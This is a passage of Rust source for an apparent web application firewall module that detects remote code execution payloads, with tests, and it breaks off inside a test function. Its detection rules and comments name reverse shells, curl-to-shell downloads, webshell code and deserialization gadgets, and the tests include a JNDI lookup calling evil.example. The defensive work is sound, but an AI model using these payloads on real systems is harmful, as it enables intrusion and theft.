//! Remote code execution signatures, checked in every request value the payload check reads.
//!
//! Each rule matches only text that ordinary input doesn't contain: a Log4Shell lookup, a
//! Shellshock function definition, a serialized object or deserialization gadget, an
//! expression-language or template sandbox escape, webshell code, an upload of a server script,
//! a reverse shell or a command that only an attack sends, or PHP code. Shell metacharacters on
//! their own, such as `;` or `|`, aren't matched here; routes whose input reaches a command get
//! those checks from `aiwaf init` (see `route_risks`).
//!
//! A value is checked as sent, then again after undoing the disguises attackers use: `$`,
//! `\x24` and `%u0024` escapes, HTML entities, fullwidth characters and invisible characters,
//! and once more when the whole value is base64.
//!
//! Java has the same rules in `RceCore.java`, written by `scripts/sync_rce_rules.py` from this
//! file; `tests/test_rce_rules_sync.py` fails when they differ.

use regex::Regex;
use std::sync::OnceLock;

/// Longest value checked. Attack strings are short; a longer value is checked by its start.
const MAX_CHARS: usize = 16384;

fn rules() -> &'static [(&'static str, Regex)] {
    static RULES: OnceLock<Vec<(&'static str, Regex)>> = OnceLock::new();
    RULES.get_or_init(|| {
        let rule = |name, pattern: &str| (name, Regex::new(pattern).unwrap());
        vec![
            // RULES START
            // () { :; }; as in a Shellshock header.
            rule("rce_shellshock", r"\(\s*\)\s*\{[^}]*;\s*\}\s*;"),
            // A serialized object, which runs code as it's read: Java (raw, hex or base64),
            // Python pickle (base64), PHP, .NET BinaryFormatter, node-serialize and unsafe YAML.
            rule(
                "rce_serialized_object",
                r#"(?x)
                ^\s*(?:rO0AB|aced0005|\xac\xed\x00\x05|gASV|AAEAAAD/////)
                |^\s*[OC]:\d+:"[A-Za-z_\\][A-Za-z0-9_\\]*":\d+:\{
                |_\$\$ND_FUNC\$\$_
                |!!(?:python/(?:object|name|module|apply)|javax?\.|ruby/object)
                |"(?:\$|__)type"\s*:\s*"System\.(?:Windows\.Data|Diagnostics|Configuration\.Install|Activities|Security\.Claims|Web\.UI|IO\.FileInfo)
                "#,
            ),
            // Classes that deserializers can be told to build and that run code or fetch it:
            // Fastjson and Jackson @type and array forms, XStream and XMLDecoder elements.
            rule(
                "rce_gadget",
                r#"(?x)
                "@type"\s*:\s*"(?:com\.sun\.rowset\.JdbcRowSetImpl|(?:com\.sun\.org\.apache|org\.apache)\.xalan(?:\.internal)?\.xsltc\.trax\.TemplatesImpl
                  |java\.lang\.(?:Class|AutoCloseable|Runtime|ProcessBuilder|Thread)|java\.net\.(?:Inet[46]?Address|URL)
                  |org\.apache\.(?:commons\.(?:configuration2?|collections4?|beanutils)|xbean|shiro\.jndi|tomcat\.dbcp|ibatis|ignite|hadoop)
                  |com\.mchange\.v2\.c3p0|ch\.qos\.logback|oracle\.jdbc|javax\.(?:naming|swing|management|script)|com\.zaxxer\.hikari
                  |org\.springframework\.(?:beans\.factory|context\.support|aop))
                |\[\s*"(?:com\.sun\.rowset\.JdbcRowSetImpl|org\.springframework\.context\.support\.(?:ClassPath|FileSystem)XmlApplicationContext
                  |ch\.qos\.logback\.core\.db\.(?:JNDIConnectionSource|DriverManagerConnectionSource)|com\.zaxxer\.hikari\.HikariConfig
                  |org\.apache\.xbean\.propertyeditor\.JndiConverter)"\s*,
                |<(?:java\.lang\.ProcessBuilder|dynamic-proxy|java\.beans\.EventHandler)(?-u:\b)
                |<object\s+class\s*=\s*["']java\.lang\.(?:ProcessBuilder|Runtime)["']
                |"dataSourceName"\s*:\s*"(?:ldaps?|rmi)://
                |^\s*(?:com\.sun\.rowset\.JdbcRowSetImpl|(?:com\.sun\.org\.apache|org\.apache)\.xalan(?:\.internal)?\.xsltc\.trax\.TemplatesImpl
                  |ch\.qos\.logback\.core\.db\.(?:JNDIConnectionSource|DriverManagerConnectionSource)|org\.apache\.xbean\.propertyeditor\.JndiConverter
                  |org\.springframework\.context\.support\.(?:ClassPath|FileSystem)XmlApplicationContext|com\.zaxxer\.hikari\.HikariConfig
                  |org\.apache\.shiro\.jndi\.JndiObjectFactory|com\.mchange\.v2\.c3p0\.(?:JndiRefForwardingDataSource|WrapperConnectionPoolDataSource))\s*$
                "#,
            ),
            // Expression languages and reflection that reach a process: OGNL, SpEL, MVEL, EL,
            // Thymeleaf and Java.
            rule(
                "rce_expression",
                r"(?xi)
                %\{\s*\(\s*\#|\#_memberAccess|@java\.lang\.(?:Runtime|ProcessBuilder|System)@|@ognl\.OgnlContext@
                |\#context\s*\[\s*['\x22]xwork|\#(?:cmd|cmds|iswin|ros)\s*=
                |(?-u:\b)T\s*\(\s*java\.lang\.(?:Runtime|ProcessBuilder|System|Class)\s*\)
                |java\.lang\.Runtime[\s\S]*\.getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(|(?-u:\b)Runtime\.getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(
                |(?-u:\b)new\s+(?:java\.lang\.)?ProcessBuilder\s*\(|javax\.script\.ScriptEngineManager
                |['\x22]{2}\s*\.\s*getClass\s*\(\s*\)\s*\.\s*forName\s*\(|\.getClass\s*\(\s*\)\s*\.\s*forName\s*\(\s*['\x22]java\.lang
                |(?-u:\b)Class\.forName\s*\(\s*['\x22]java\.lang\.(?:Runtime|ProcessBuilder)
                |__\$\{[\s\S]*\}__\s*::
                |(?-u:\b)class\.(?:module\.)?classLoader(?-u:\b)|freemarker\.template\.utility\.(?:Execute|ObjectConstructor)
                ",
            ),
            // Template and sandbox escapes: Jinja and other Python templates, Twig, Smarty,
            // Velocity, Mako, Ruby ERB and Node.js.
            rule(
                "rce_template_escape",
                r#"(?x)
                __(?:class|mro|base|bases)__\s*(?:\.|\[)[\s\S]*__subclasses__\s*\(
                |__subclasses__\s*\(\s*\)\s*\[
                |(?-u:\b)(?:lipsum|cycler|joiner|namespace|url_for|get_flashed_messages|request\.application|config)\s*\.\s*__(?:globals|init__)
                |__builtins__\s*(?:\.|\[)\s*['"]?(?:__import__|eval|exec|open)
                |__import__\s*\(\s*['"](?:os|subprocess|pty|socket|commands|builtins)['"]\s*\)
                |_self\.env\.registerUndefinedFilterCallback
                |\|\s*(?:filter|map|reduce|sort)\s*\(\s*['"](?:system|passthru|exec|shell_exec|popen|proc_open)['"]
                |\{(?:php\}|system\s*\()
                |\$class\.inspect\s*\(|\#set\s*\(\s*\$\w+\s*=\s*\$\w+\.getClass\s*\(\s*\)
                |<%\s*import\s+(?:os|subprocess)(?-u:\b)
                |<%=?\s*(?:system|exec|spawn|IO\.popen|Kernel\.(?:system|exec|spawn))\s*[\('"`]|<%=?\s*(?:`|%x)
                |(?-u:\b)require\s*\(\s*['"](?:node:)?child_process['"]\s*\)
                |(?-u:\b)process\s*\.\s*mainModule(?-u:\b)|(?-u:\b)global\s*\.\s*process\s*\.\s*(?:binding|mainModule)
                |(?-u:\b)constructor\s*\.\s*constructor\s*\(\s*['"]|(?-u:\b)Function\s*\(\s*['"]return\s+process(?-u:\b)
                "#,
            ),
            // Webshell code: JSP, ASP and ASP.NET, and PHP that runs what the request sends.
            rule(
                "rce_webshell",
                r#"(?xi)
                (?-u:\b)Runtime\.getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*request\.getParameter
                |<%@\s*page(?-u:\b)[^>]*(?-u:\b)import\s*=\s*["'][^"']*java\.(?:io|lang\.Process)
                |(?-u:\b)Process\.Start\s*\(\s*(?:Request|new\s+ProcessStartInfo)
                |<%\s*eval\s*\(?\s*request(?-u:\b)|(?-u:\b)eval\s*\(\s*Request(?:\.Item)?\s*\[
                |\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\(
                |(?-u:\b)create_function\s*\(|(?-u:\b)preg_replace\s*\(\s*['"]/[^'"]*/[a-z]*e[a-z]*['"]\s*,
                |(?-u:\b)base64_decode\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)
                |(?-u:\b)(?:assert|eval)\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(
                "#,
            ),
            // An upload whose file name runs as code on the server, as in filename="shell.php".
            rule(
                "rce_script_upload",
                r#"(?i)(?-u:\b)filename\s*=\s*"?[^"\r\n;]*\.(?:php[3-8]?|phtml|phar|pht|phps|jspx?|jsw|jsv|jspf|aspx?|ashx|asmx|asa|cer|cshtml|cgi|shtml|htaccess)"?\s*(?:;|\r?\n|$)"#,
            ),
            // A command chained onto a value at its end, as scanners send it: x;id, |whoami,
            // && uname -a, ; sleep 5, test`id`, $(sleep 5). Only commands that probe or time the
            // host count, and a bare id must touch its separator, so "name; id" and Markdown's
            // "the `id` field" aren't matched.
            rule(
                "rce_command_injection",
                r"(?xi)
                (?:;|\|\|?|&&|\n)(?:id|\s*(?:whoami|uname\s+-[a-z]+|ifconfig|ipconfig(?:\s+/all)?|hostname
                    |sleep\s+[0-9]{1,3}|ping\s+-[cn]\s*[0-9]{1,3}\s+[\w.\-]+|nslookup\s+[\w.\-]+|net\s+user
                    |cat\s+/proc/self/environ))\s*(?:[;&|\#]\s*)*$
                |[\w'\x22)\]]`(?:id|whoami|uname\s+-a|sleep\s+[0-9]{1,3}|hostname)`
                |\$\(\s*(?:sleep\s+[0-9]{1,3}|ping\s+-[cn]|nslookup\s|hostname|ifconfig)[^)]*\)
                ",
            ),
            // A reverse shell, download-and-run, or a command only an attack sends, as in
            // bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 or ; cat /etc/passwd.
            rule(
                "rce_shell_payload",
                r"(?xi)
                /dev/(?:tcp|udp)/[A-Za-z0-9.\-]+/\d+
                |(?-u:\b)(?:ba|z|da)?sh\s+-i\s*(?:[<>]|2\s*>)
                |(?-u:\b)nc(?:at)?\s+(?:-[a-z]+\s+)*-e\s+/bin/
                |(?-u:\b)mkfifo\s+/tmp/
                |(?-u:\b)python[23]?\s+-c\s+['\x22]\s*import\s+(?:socket|pty|os|subprocess)
                |(?-u:\b)(?:curl|wget)\s+[^\s|;&]+\s*(?:-\w+\s+[^\s|;&]+\s*)*\|\s*(?:sudo\s+)?(?:ba|z)?sh(?-u:\b)
                |(?-u:\b)(?:wget|curl)\s+[^\s;|&]+\s+(?:-\w+\s+)*-[oO]\s+/tmp/
                |\$\(\s*(?:curl|wget|nc|ncat|bash|sh|python[23]?|perl|whoami|id|uname)(?:\s[^)]*)?\)
                |[;&|\n`]\s*(?:/bin/)?(?:ba|z|da)?sh\s+-c\s
                |[;&|\n`]\s*(?:cat|head|tail|more|less|nl|tac)\s+/etc/(?:passwd|shadow|sudoers)(?-u:\b)
                |\$\{IFS\}|(?-u:\b)chmod\s+\+?[0-7]*x?\s+/tmp/\w
                |[;&|]\s*(?:type|more)\s+[a-z]:\\windows\\win\.ini
                |(?-u:\b)powershell(?:\.exe)?\s+(?:-\w+\s+)*-(?:enc|encodedcommand|e)\s+[A-Za-z0-9+/=]{16}
                |(?-u:\b)cmd(?:\.exe)?\s+/c\s+(?:powershell|certutil|bitsadmin|mshta)(?-u:\b)
                |(?-u:\b)certutil(?:\.exe)?\s+(?:-f\s+)?-urlcache(?-u:\b)|(?-u:\b)bitsadmin(?:\.exe)?\s+/transfer(?-u:\b)
                |(?-u:\b)mshta(?:\.exe)?\s+(?:https?|vbscript|javascript):|(?-u:\b)regsvr32(?:\.exe)?\s+/s\s+(?:/n\s+)?(?:/u\s+)?/i:
                |(?-u:\b)IEX\s*\(|(?-u:\b)Invoke-Expression(?-u:\b)|\.DownloadString\s*\(|(?-u:\b)New-Object\s+(?:System\.)?Net\.WebClient(?-u:\b)
                ",
            ),
            // PHP code and the stream wrappers that run it.
            rule(
                "rce_php",
                r"(?xi)
                <\?php
                |(?-u:\b)(?:system|passthru|shell_exec|proc_open|popen|pcntl_exec|assert|eval)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)
                |(?-u:\b)(?:php://(?:input|filter/[^\s]*resource=)|expect://|phar://)
                |(?-u:\b)data://text/plain;base64,
                ",
            ),
            // RULES END
        ]
    })
}

/// A Log4j lookup, after undoing the nesting attackers use to hide it, as in
/// `${${lower:j}${::-n}di:ldap://x}` or `${${date:'j'}ndi:...}`.
fn jndi(value: &str) -> bool {
    static NESTED: OnceLock<Regex> = OnceLock::new();
    static DATE: OnceLock<Regex> = OnceLock::new();
    static LOOKUP: OnceLock<Regex> = OnceLock::new();
    let nested = NESTED.get_or_init(|| Regex::new(r"(?i)\$\{(?:(?:lower|upper)\s*:|[^${}]*?:-)([^${}]*)\}").unwrap());
    let date = DATE.get_or_init(|| Regex::new(r"(?i)\$\{\s*date\s*:\s*'([^']*)'\s*\}").unwrap());
    let lookup = LOOKUP.get_or_init(|| {
        Regex::new(r"(?i)\$\{\s*jndi\s*:\s*(?:ldaps?|rmi|dns|iiop|corba|nis|nds|https?)\s*:").unwrap()
    });
    if !value.contains("${") {
        return false;
    }
    let mut text = value.to_owned();
    for _ in 0..8 {
        let next = nested.replace_all(&text, "$1");
        let next = date.replace_all(&next, "$1").into_owned();
        if next == text {
            break;
        }
        text = next;
    }
    lookup.is_match(&text)
}

/// Named HTML entities attackers use for the characters these rules look for.
const ENTITIES: &[(&str, char)] = &[
    ("dollar", '$'), ("lbrace", '{'), ("rbrace", '}'), ("lcub", '{'), ("rcub", '}'), ("lpar", '('), ("rpar", ')'),
    ("colon", ':'), ("sol", '/'), ("bsol", '\\'), ("lt", '<'), ("gt", '>'), ("quot", '"'), ("apos", '\''), ("amp", '&'),
    ("semi", ';'), ("vert", '|'), ("verbar", '|'), ("grave", '`'), ("num", '#'), ("percnt", '%'), ("period", '.'),
    ("lsqb", '['), ("rsqb", ']'), ("excl", '!'), ("quest", '?'), ("equals", '='), ("commat", '@'), ("lowbar", '_'),
];

fn hex(chars: &[char]) -> Option<char> {
    let text: String = chars.iter().collect();
    u32::from_str_radix(&text, 16).ok().and_then(char::from_u32)
}

/// The value with escapes, entities, fullwidth and invisible characters undone, or None when
/// there's nothing to undo.
fn normalize(text: &str) -> Option<String> {
    if !text.bytes().any(|b| b == b'\\' || b == b'&' || b == b'%' || b >= 0x80) {
        return None;
    }
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        // \uXXXX, \u{X}, %uXXXX and \xXX.
        if (c == '\\' || c == '%') && matches!(next, Some('u') | Some('U')) {
            if c == '\\' && chars.get(i + 2) == Some(&'{') {
                if let Some(end) = chars[i + 3..].iter().take(7).position(|&x| x == '}') {
                    if let Some(decoded) = hex(&chars[i + 3..i + 3 + end]) {
                        out.push(decoded);
                        i += 4 + end;
                        continue;
                    }
                }
            } else if i + 6 <= chars.len() && chars[i + 2..i + 6].iter().all(char::is_ascii_hexdigit) {
                if let Some(decoded) = hex(&chars[i + 2..i + 6]) {
                    out.push(decoded);
                    i += 6;
                    continue;
                }
            }
        }
        if c == '\\' && matches!(next, Some('x') | Some('X')) && i + 4 <= chars.len()
            && chars[i + 2..i + 4].iter().all(char::is_ascii_hexdigit)
        {
            if let Some(decoded) = hex(&chars[i + 2..i + 4]) {
                out.push(decoded);
                i += 4;
                continue;
            }
        }
        // &#36;, &#x24; and &dollar;.
        if c == '&' {
            if let Some(end) = chars[i + 1..].iter().take(12).position(|&x| x == ';') {
                let body: String = chars[i + 1..i + 1 + end].iter().collect();
                let decoded = if let Some(number) = body.strip_prefix('#') {
                    match number.strip_prefix(['x', 'X']) {
                        Some(digits) => u32::from_str_radix(digits, 16).ok(),
                        None => number.parse::<u32>().ok(),
                    }
                    .and_then(char::from_u32)
                } else {
                    ENTITIES.iter().find(|(name, _)| *name == body).map(|(_, value)| *value)
                };
                if let Some(decoded) = decoded {
                    out.push(decoded);
                    i += end + 2;
                    continue;
                }
            }
        }
        match c {
            // Fullwidth forms of ASCII, as in ％{ or ＄｛.
            '\u{FF01}'..='\u{FF5E}' => out.push(char::from_u32(c as u32 - 0xFEE0).unwrap_or(c)),
            // Invisible characters placed inside a word, as in jn\u{200B}di.
            '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{2060}' | '\u{FEFF}' | '\u{00AD}' => (),
            _ => out.push(c),
        }
        i += 1;
    }
    if out == text { None } else { Some(out) }
}

/// The text a whole-value base64 string holds, when it decodes to readable text.
fn base64_bytes(text: &str) -> Option<Vec<u8>> {
    let value = text.trim();
    if value.len() < 16 || value.len() > MAX_CHARS || value.len() % 4 == 1 {
        return None;
    }
    let mut bits = 0u32;
    let mut count = 0;
    let mut bytes = Vec::with_capacity(value.len() * 3 / 4);
    for b in value.bytes() {
        let digit = match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            _ => return None,
        };
        bits = (bits << 6) | u32::from(digit);
        count += 6;
        if count >= 8 {
            count -= 8;
            bytes.push((bits >> count) as u8);
            bits &= (1 << count) - 1;
        }
    }
    Some(bytes)
}

/// Text that decodes as UTF-8 and is mostly readable, as a decoded value must be to be checked.
fn readable_text(bytes: Vec<u8>) -> Option<String> {
    let decoded = String::from_utf8(bytes).ok()?;
    let readable = decoded.chars().filter(|c| !c.is_control() || c.is_whitespace()).count();
    (readable * 10 >= decoded.chars().count() * 9).then_some(decoded)
}

/// The bytes of a gzip or zlib stream, inflated to at most `limit` bytes, or None when the
/// bytes aren't one. A stream that inflates past the limit is cut there.
pub fn inflate(raw: &[u8], limit: usize) -> Option<Vec<u8>> {
    use std::io::Read;
    let mut out = Vec::new();
    let read = if raw.starts_with(&[0x1f, 0x8b]) {
        flate2::read::MultiGzDecoder::new(raw).take(limit as u64).read_to_end(&mut out)
    } else if zlib_header(raw) {
        flate2::read::ZlibDecoder::new(raw).take(limit as u64).read_to_end(&mut out)
    } else {
        return None;
    };
    read.ok().map(|_| out)
}

/// A zlib header: deflate with a window of at most 32 KB and a valid check value, as in 78 9C.
pub fn zlib_header(raw: &[u8]) -> bool {
    raw.len() >= 2 && raw[0] & 0x0f == 8 && raw[0] >> 4 <= 7 && (u16::from(raw[0]) << 8 | u16::from(raw[1])) % 31 == 0
}

/// A value sent as base64, checked for what it holds: text, a binary serialized object, or a
/// compressed stream of either, unwrapped up to three layers deep, as in base64(base64(x)).
fn base64_layers(text: &str, layers: usize) -> Option<&'static str> {
    let mut bytes = base64_bytes(text)?;
    if let Some(rule) = classify_binary(&bytes) {
        return Some(rule);
    }
    if let Some(inflated) = inflate(&bytes, MAX_CHARS * 4) {
        if let Some(rule) = classify_binary(&inflated) {
            return Some(rule);
        }
        bytes = inflated;
    }
    let decoded = readable_text(bytes)?;
    let normalized = normalize(&decoded);
    check(&decoded)
        .or_else(|| normalized.as_deref().and_then(check))
        .or_else(|| if layers > 1 { base64_layers(normalized.as_deref().unwrap_or(&decoded), layers - 1) } else { None })
}

/// Every rule in one pass: most values match none, and one scan is much cheaper than nine.
fn rule_set() -> &'static regex::RegexSet {
    static SET: OnceLock<regex::RegexSet> = OnceLock::new();
    SET.get_or_init(|| {
        // A larger lazy-DFA cache, so long values don't make it rebuild and fall back to slower matchers.
        regex::RegexSetBuilder::new(rules().iter().map(|(_, pattern)| pattern.as_str()))
            .dfa_size_limit(32 << 20)
            .build()
            .unwrap()
    })
}

fn check(text: &str) -> Option<&'static str> {
    if jndi(text) {
        return Some("rce_jndi_lookup");
    }
    // The first rule that matches, in order, names the finding.
    rule_set().matches(text).iter().next().map(|index| rules()[index].0)
}

/// Bytes at least one of which every rule needs (or an escape, entity or non-ASCII character
/// that normalizing could turn into one). Plain words and numbers have none of them.
const TRIGGERS: [bool; 256] = {
    let mut table = [false; 256];
    let bytes = b"()[]{}<>$!\"'%#@._|:=/-;&\n\r`\\";
    let mut i = 0;
    while i < bytes.len() {
        table[bytes[i] as usize] = true;
        i += 1;
    }
    let mut high = 0x80;
    while high < 256 {
        table[high] = true;
        high += 1;
    }
    table
};

/// Serialized objects that start with letters and digits only, as in rO0AB (Java) or gASV (pickle).
const SERIALIZED_PREFIXES: [&str; 4] = ["rO0AB", "aced0005", "gASV", "AAEAAAD"];

/// False when no rule can match the value, which is most of them: a cheap byte scan that saves
/// running the rules at all.
fn may_match(text: &str) -> bool {
    text.bytes().any(|b| TRIGGERS[b as usize]) || SERIALIZED_PREFIXES.iter().any(|p| text.trim_start().starts_with(p))
}

/// Markers of the attacks that are only visible in a whole document, not in any one of its values.
const DOCUMENT_MARKERS: [&str; 13] = [
    "@type", "$type", "__type", "dataSourceName", "<java", "<object", "<sorted-set", "<dynamic-proxy",
    "java.beans", "<%", "<?", "[\"", "\\u",
];

/// The check for a whole JSON or XML document, before its values are checked one by one: it
/// runs only when the document has a marker of an attack in its shape, such as
/// {"@type": "com.sun.rowset.JdbcRowSetImpl"} or <dynamic-proxy>.
pub fn classify_document(text: &str) -> Option<&'static str> {
    if DOCUMENT_MARKERS.iter().any(|marker| text.contains(marker)) { classify(text) } else { None }
}

/// Returns the rule for a value that carries remote code execution, or None. The value is
/// checked as sent, then with its disguises undone, then as base64.
pub fn classify(value: &str) -> Option<&'static str> {
    #[cfg(test)]
    if BENCH_OFF.load(std::sync::atomic::Ordering::Relaxed) {
        return None;
    }
    let capped: String;
    let text = if value.len() <= MAX_CHARS {
        value
    } else {
        capped = value.chars().take(MAX_CHARS).collect();
        &capped
    };
    let mut normalized = None;
    if may_match(text) {
        if let Some(rule) = check(text) {
            return Some(rule);
        }
        normalized = normalize(text);
        if let Some(rule) = normalized.as_deref().and_then(check) {
            return Some(rule);
        }
    }
    // Base64 has none of the trigger bytes, so it's decoded and checked whatever the scan found.
    base64_layers(normalized.as_deref().unwrap_or(text), 3)
}

/// Rules checked in an uploaded file's content: code a server runs if the file lands where it
/// serves scripts, as in an image with <?php in its metadata. Other rules aren't, since an
/// ordinary document can quote an attack.
const UPLOAD_RULES: [&str; 2] = ["rce_php", "rce_webshell"];

/// Returns the rule for an uploaded file's content: a binary serialized object, or PHP, JSP or
/// ASP code in its first 16 KB.
pub fn classify_upload(content: &[u8]) -> Option<&'static str> {
    if let Some(rule) = classify_binary(content) {
        return Some(rule);
    }
    let text = String::from_utf8_lossy(&content[..content.len().min(MAX_CHARS)]);
    if !text.contains(['<', '$', '(']) {
        return None;
    }
    rule_set().matches(&text).iter().map(|index| rules()[index].0).find(|rule| UPLOAD_RULES.contains(rule))
}

/// Returns the rule for a raw binary serialized object, as sent in a body or a %XX-escaped
/// field: Java (AC ED 00 05), pickle (80 02..05), .NET BinaryFormatter and Ruby Marshal. Text
/// checks can't see these, since the bytes aren't valid UTF-8.
pub fn classify_binary(raw: &[u8]) -> Option<&'static str> {
    let start = raw.len() - raw.trim_ascii_start().len();
    let raw = &raw[start..];
    let found = raw.starts_with(&[0xac, 0xed, 0x00, 0x05])
        || (raw.len() >= 8 && raw[0] == 0x80 && (2..=5).contains(&raw[1]))
        || raw.starts_with(&[0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff])
        || (raw.starts_with(&[0x04, 0x08]) && {
            let head = &raw[..raw.len().min(256)];
            head.windows(2).any(|w| w == b"o:") || head.windows(5).any(|w| w == b"Gem::")
        });
    found.then_some("rce_serialized_object")
}

/// True for a field name that reaches an object's prototype, as in __proto__, a[__proto__][x]
/// or constructor.prototype.x: prototype pollution, which turns into code execution through
/// options that Node libraries pass to child_process or template compilers.
pub fn polluting_key(name: &str) -> bool {
    if !name.contains("__proto__") && !name.contains("prototype") {
        return false;
    }
    let parts: Vec<&str> = name.split(['[', ']', '.']).filter(|part| !part.is_empty()).collect();
    parts.contains(&"__proto__") || parts.windows(2).any(|pair| pair == ["constructor", "prototype"])
}

/// Checks each field of a query string or form body on its own, so a rule anchored to the start
/// of a value, as in data=rO0AB..., and a binary value, as in data=%AC%ED%00%05..., are found.
pub fn classify_fields(text: &str) -> Option<&'static str> {
    if !text.contains(['&', '=']) {
        return None;
    }
    for field in text.split('&').take(1024) {
        let (name, value) = field.split_once('=').unwrap_or((field, ""));
        if polluting_key(&crate::payload::decode(name.as_bytes())) {
            return Some("rce_prototype_pollution");
        }
        let raw = crate::payload::decode_bytes(value.as_bytes(), true);
        if let Some(rule) = classify_binary(&raw) {
            return Some(rule);
        }
        if let Some(rule) = classify(&String::from_utf8_lossy(&raw)) {
            return Some(rule);
        }
    }
    None
}

/// Turns the check off in the timing test, to measure what it costs. Not in real builds.
#[cfg(test)]
pub(crate) static BENCH_OFF: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

#[cfg(test)]
mod tests {
    use super::classify;
    use serde_json::Value;

    fn cases() -> Value {
        serde_json::from_str(include_str!("../../../../tests/fixtures/rce_cases.json")).unwrap()
    }

    #[test]
    fn shared_attacks_are_found() {
        for case in cases()["attacks"].as_array().unwrap() {
            let (value, rule) = (case[0].as_str().unwrap(), case[1].as_str().unwrap());
            assert_eq!(classify(value), Some(rule), "{value}");
        }
    }

    #[test]
    fn ordinary_text_passes() {
        let shared: Value = serde_json::from_str(include_str!("../../../../tests/fixtures/ordinary_text.json")).unwrap();
        let ordinary = cases();
        let flagged: Vec<String> = shared["values"]
            .as_array()
            .unwrap()
            .iter()
            .chain(ordinary["ordinary"].as_array().unwrap())
            .filter_map(|value| {
                let value = value.as_str().unwrap();
                classify(value).map(|rule| format!("{value:?} ({rule})"))
            })
            .collect();
        assert!(flagged.is_empty(), "{flagged:?}");
    }

    fn inspect(query: &[u8], body: &[u8]) -> Option<String> {
        crate::payload::inspect_sql(query, body, 65536, false).map(|(rule, _)| rule)
    }

    #[test]
    fn form_fields_and_json_keys_are_checked() {
        let cases = cases();
        for (section, ordinary) in [("form_attacks", "ordinary_forms"), ("json_attacks", "ordinary_json")] {
            for case in cases[section].as_array().unwrap() {
                let (value, rule) = (case[0].as_str().unwrap(), case[1].as_str().unwrap());
                assert_eq!(inspect(b"", value.as_bytes()).as_deref(), Some(rule), "{value}");
                if section == "form_attacks" {
                    assert_eq!(inspect(value.as_bytes(), b"").as_deref(), Some(rule), "query {value}");
                }
            }
            for value in cases[ordinary].as_array().unwrap() {
                let value = value.as_str().unwrap();
                assert_eq!(inspect(b"", value.as_bytes()), None, "{value}");
            }
        }
    }

    #[test]
    fn binary_serialized_bodies_are_found() {
        for body in [
            &b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap"[..],
            b"\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94",
            b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00",
            b"\x04\x08o:\x08Foo\x00",
        ] {
            assert_eq!(inspect(b"", body).as_deref(), Some("rce_serialized_object"), "{body:?}");
        }
        // A UTF-16 JSON body has NUL bytes too, but isn't a serialized object.
        let utf16: Vec<u8> = "{\"a\":\"b\"}".encode_utf16().flat_map(u16::to_le_bytes).collect();
        assert_eq!(inspect(b"", &utf16), None);
    }

    #[test]
    fn gzip_bodies_are_read_inflated() {
        use std::io::Write;
        let gzip = |data: &[u8]| {
            let mut out = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            out.write_all(data).unwrap();
            out.finish().unwrap()
        };
        assert_eq!(inspect(b"", &gzip(br#"{"q":"${jndi:ldap://evil.example/a}"}"#)).as_deref(), Some("rce_jndi_lookup"));
        assert_eq!(inspect(b"", &gzip(b"id=1%20OR%201%3D1")).as_deref(), Some("sql_breakout_numeric"));
        assert_eq!(inspect(b"", &gzip(br#"{"name":"O'Reilly","note":"ordinary"}"#)), None);
        // A small body that inflates past the budget is refused without being inflated in full.
        let bomb = gzip(&vec![b'a'; 10 << 20]);
        assert!(bomb.len() < 65536);
        assert_eq!(crate::payload::inspect_sql(b"", &bomb, 65536, false), Some(("payload_inspection_limit".into(), 413)));
        // Gzip inside gzip is read too, within the same budget.
        assert_eq!(inspect(b"", &gzip(&gzip(b"q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D"))).as_deref(), Some("rce_jndi_lookup"));
        let mut nested = vec![b'a'; 60_000];
        for _ in 0..3 {
            nested = gzip(&nested);
        }
        assert_eq!(crate::payload::inspect_sql(b"", &nested, 65536, false), None);
        assert_eq!(crate::payload::inspect_sql(b"", &nested, 60_000, false).map(|f| f.1), Some(413));
        // Bytes that only start like gzip are read as they are.
        assert_eq!(inspect(b"", b"\x1f\x8bnot really gzip"), None);
    }

    #[test]
    fn multipart_bodies_are_checked_part_by_part() {
        let cases = cases();
        for case in cases["multipart_attacks"].as_array().unwrap() {
            let (body, rule) = (case[0].as_str().unwrap(), case[1].as_str().unwrap());
            assert_eq!(inspect(b"", body.as_bytes()).as_deref(), Some(rule), "{body}");
        }
        for body in cases["ordinary_multipart"].as_array().unwrap() {
            assert_eq!(inspect(b"", body.as_str().unwrap().as_bytes()), None, "{body}");
        }
        // A binary file holding a Java object, and a body cut short, as a checked prefix is.
        let mut binary = b"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x.bin\"\r\n\r\n".to_vec();
        binary.extend_from_slice(b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap");
        assert_eq!(inspect(b"", &binary).as_deref(), Some("rce_serialized_object"));
        let cut = b"--b\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n${jndi:ldap://x/a} and more tex";
        assert_eq!(inspect(b"", cut).as_deref(), Some("rce_jndi_lookup"));
        // Ordinary text that starts with -- isn't multipart.
        assert_eq!(inspect(b"", b"-- a note\nwith lines"), None);
        let parts = crate::payload::multipart_parts(b"--b\r\nContent-Disposition: form-data; name=\"a\"; filename*=UTF-8''x.php\r\n\r\nhi\r\n--b--").unwrap();
        assert_eq!((parts[0].name.as_str(), parts[0].filename.as_deref()), ("a", Some("UTF-8''x.php")));
    }

    #[test]
    fn deflate_bodies_and_every_header_are_checked() {
        use std::io::Write;
